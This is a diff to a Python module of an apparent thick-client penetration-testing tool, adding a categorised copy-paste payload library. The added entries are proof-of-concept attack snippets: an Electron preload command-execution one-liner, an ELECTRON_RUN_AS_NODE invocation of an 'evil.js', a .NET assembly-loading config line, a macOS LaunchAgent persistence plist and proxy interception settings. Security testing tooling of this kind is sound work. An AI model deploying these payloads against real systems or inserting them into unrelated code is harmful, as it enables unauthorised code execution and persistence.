@@ -114,6 +114,94 @@ PRECONFIGURED_PAYLOADS: Dict[str, List[Dict[str, Any]]] = {
 }
 
 
+# Surface -> category for HackBar-style payload library
+_SURFACE_TO_CATEGORY = {
+    "electron_preload": "Electron",
+    "preload_write": "Electron",
+    "electron_helper": "Electron",
+    "network_mitm": "Network",
+    "qt_rpath_plugin_drop": "Qt",
+    "macos_launch_persistence": "Persistence",
+    "windows_persistence": "Persistence",
+    "linux_persistence": "Persistence",
+    "dotnet_managed": ".NET",
+    "jar_archive": "JAR",
+}
+
+
 def get_payloads_for_surface(surface_id: str) -> List[Dict[str, Any]]:
     """Return preconfigured payloads for a surface (for confirm-exploitation flow)."""
     return list(PRECONFIGURED_PAYLOADS.get(surface_id, []))
+
+
+def get_payload_library() -> List[Dict[str, Any]]:
+    """
+    Return full payload library for HackBar-style UI: flat list with category.
+    Each item: category, name, description, payload, type, reference [, surface].
+    """
+    out: List[Dict[str, Any]] = []
+    for surface_id, payload_list in PRECONFIGURED_PAYLOADS.items():
+        cat = _SURFACE_TO_CATEGORY.get(surface_id, "Other")
+        for p in payload_list:
+            entry = {
+                "category": cat,
+                "name": p.get("name") or "",
+                "description": p.get("description") or "",
+                "payload": p.get("payload") or "",
+                "type": p.get("type") or "steps",
+                "reference": p.get("reference") or "",
+                "surface": surface_id,
+            }
+            out.append(entry)
+    # Add extra copy-paste payloads for thick-client (HackBar-style one-liners/snippets)
+    _append_extra_payloads(out)
+    return out
+
+
+def _append_extra_payloads(out: List[Dict[str, Any]]) -> None:
+    """Append additional thick-client payload snippets for the library."""
+    extras = [
+        {
+            "category": "Electron",
+            "name": "Preload execSync one-liner",
+            "description": "Minimal preload snippet: run command and expose result.",
+            "payload": "process.once('loaded',()=>{require('child_process').execSync('id',{encoding:'utf8'});});",
+            "type": "script",
+            "reference": "Electron renderer RCE",
+        },
+        {
+            "category": "Electron",
+            "name": "ELECTRON_RUN_AS_NODE",
+            "description": "Run app as Node and execute script (if app supports).",
+            "payload": "ELECTRON_RUN_AS_NODE=1 /path/to/app/Electron /path/to/evil.js",
+            "type": "script",
+            "reference": "Electron CVE-2018-1000136",
+        },
+        {
+            "category": ".NET",
+            "name": "Type.GetType config",
+            "description": "Example .config snippet that loads type from assembly.",
+            "payload": "<add key=\"evil\" value=\"Namespace.TypeName, AssemblyName\"/>",
+            "type": "file",
+            "reference": "Type.GetType / assembly load",
+        },
+        {
+            "category": "Persistence",
+            "name": "LaunchAgent plist (minimal)",
+            "description": "Minimal RunAtLoad plist for macOS.",
+            "payload": "<key>RunAtLoad</key><true/><key>ProgramArguments</key><array><string>/tmp/poc.sh</string></array>",
+            "type": "file",
+            "reference": "macOS LaunchAgent",
+        },
+        {
+            "category": "Network",
+            "name": "Proxy env",
+            "description": "Force app to use Burp proxy.",
+            "payload": "export HTTP_PROXY=http://127.0.0.1:8080 HTTPS_PROXY=http://127.0.0.1:8080",
+            "type": "script",
+            "reference": "MITM thick client",
+        },
+    ]
+    for e in extras:
+        e["surface"] = ""
+        out.append(e)
